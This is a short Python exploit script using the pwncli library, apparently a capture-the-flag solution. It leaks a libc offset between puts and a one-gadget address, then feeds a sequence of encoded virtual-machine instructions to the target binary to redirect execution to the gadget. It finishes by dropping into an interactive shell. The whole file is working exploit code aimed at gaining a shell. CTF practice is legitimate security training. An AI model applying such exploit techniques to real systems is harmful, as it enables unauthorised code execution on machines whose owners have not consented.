from pwncli import *
cli_script()

p:tube = gift['io']

def getnum(op, third, second, one): 
    return (op << 24) | (third << 16) | (second << 8) | one

if gift['remote']:
    putsaddr = 0x6f6a0
    gadgetaddr = 0x4527a
elif gift['debug']:
    putsaddr = 0x80aa0
    gadgetaddr = 0x4f432 # 


name = p64(int(abs(putsaddr - gadgetaddr)))

p.sendafter("name:\n", name)
sleep(0.5)

shell_number = [
    getnum(0x10, 0, 0, 0x100 - 120),
    getnum(0x10, 1, 0, 0x100 - 20),
    getnum(0x70, 2, 0, 0),
    getnum(0x70, 3, 2, 1),
    getnum(0x10, 4, 0, 0x100 - 41),
    getnum(0x70, 5, 4, 2),
    getnum(0x30, 6, 0, 5),
    getnum(0x30, 7, 0, 3),
    getnum(0x10, 0, 0, 0x100 - 70),
    getnum(0x70, 1, 5, 0),
    getnum(0x70, 2, 6, 7) if putsaddr < gadgetaddr else getnum(0x80, 2, 6, 7), 
    getnum(0x40, 2, 0, 1)
]

show_number = [
    getnum(0x10, 0, 0, 0x100 - 120),
    getnum(0x10, 1, 0, 0x100 - 20),
    getnum(0x70, 2, 0, 0),
    getnum(0x70, 3, 2, 1),
    getnum(0x10, 4, 0, 0x100 - 41),
    getnum(0x70, 5, 4, 2),
    getnum(0x30, 6, 0, 5),
    getnum(0x40, 6, 0, 3)
]

last = shell_number

p.sendlineafter("Size:\n", str(len(last)))

p.recvuntil("?????\n")

for i in last:
    p.sendline(str(i))
    sleep(0.5)

p.interactive()